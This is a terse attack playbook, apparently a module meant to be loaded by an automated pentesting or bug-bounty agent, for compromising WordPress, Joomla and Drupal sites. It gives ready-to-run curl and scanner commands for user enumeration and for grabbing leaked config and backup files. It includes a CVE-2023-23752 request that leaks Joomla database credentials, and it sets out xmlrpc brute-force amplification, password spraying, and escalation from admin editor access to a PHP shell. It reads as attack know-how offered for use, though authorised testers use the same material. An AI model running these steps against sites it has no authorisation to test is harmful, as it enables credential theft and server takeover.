# Moraa — WordPress & Joomla (and CMS quick wins)

> Load when the target is WordPress/Joomla/Drupal. CMS bugs are mostly **vulnerable plugins/
> components, exposed users/config, and weak auth**. Fast, high hit-rate on marketing/blog subdomains.

## WordPress
```bash
# fingerprint + vuln scan
wpscan --url https://T --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token $WPS_TOKEN
# manual quick wins
curl -sk https://T/wp-json/wp/v2/users            # user enum (ids + slugs → usernames)
curl -sk https://T/?author=1                       # user enum via redirect to /author/<login>
curl -sk https://T/wp-content/debug.log            # leaked errors/paths/creds
curl -sk https://T/wp-config.php.bak https://T/wp-config.php~ https://T/.wp-config.php.swp   # config leak
curl -sk https://T/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
#   xmlrpc: pingback SSRF (pingback.ping), amplified brute (system.multicall)
```
High-value WP issues:
```
- vulnerable plugin RCE/SQLi/LFI/arbitrary-upload (wpscan → CVE) — the #1 WP finding.
- REST API: /wp-json/ endpoints from plugins with missing permission_callback → IDOR/unauth actions.
- user enum → password spray (admin/editor) ; app-passwords ; weak nonce reuse.
- xmlrpc pingback → SSRF/port-scan ; system.multicall → auth brute amplification.
- exposed backups (wp-config.*, *.sql, wp-content/uploads/*.zip) ; open /wp-content/uploads listing.
- author/media IDOR ; unauthenticated draft/private post access via REST.
- admin RCE via theme/plugin editor (if creds) → write PHP → shell (file-upload.md).
```

## Joomla
```bash
curl -sk https://T/administrator/manifests/files/joomla.xml   # version
curl -sk https://T/language/en-GB/en-GB.xml                    # version fallback
curl -sk "https://T/index.php?option=com_users&view=registration"  # open registration?
juumla / joomlavs / joomscan --url https://T                  # scanners
curl -sk https://T/configuration.php~ https://T/configuration.php.bak   # config leak
```
High-value Joomla issues:
```
- vulnerable component (com_*) SQLi/LFI/RCE (CVE) — check version → known exploits.
- CVE-2023-23752 (Joomla <4.2.8) unauth API info-leak → DB creds:
    curl -sk "https://T/api/index.php/v1/config/application?public=true"   # leaks user/password
- admin login brute ; template editor RCE (with creds) ; exposed /administrator with default creds.
- com_fields / com_users registration privilege issues.
```

## Drupal (quick)
```bash
curl -sk https://T/CHANGELOG.txt   # version ; droopescan scan -u https://T
# Drupalgeddon2 (CVE-2018-7600) / SA-CORE RCEs on old cores ; /user/register open ; services module.
```

## Generic CMS method
Fingerprint version + enumerate plugins/components/themes → map each to a known CVE → confirm the
n-day → check config/backup leaks + user enum + open registration → auth spray → (with creds)
theme/plugin editor → RCE. → `validate.md` → `findings/`.
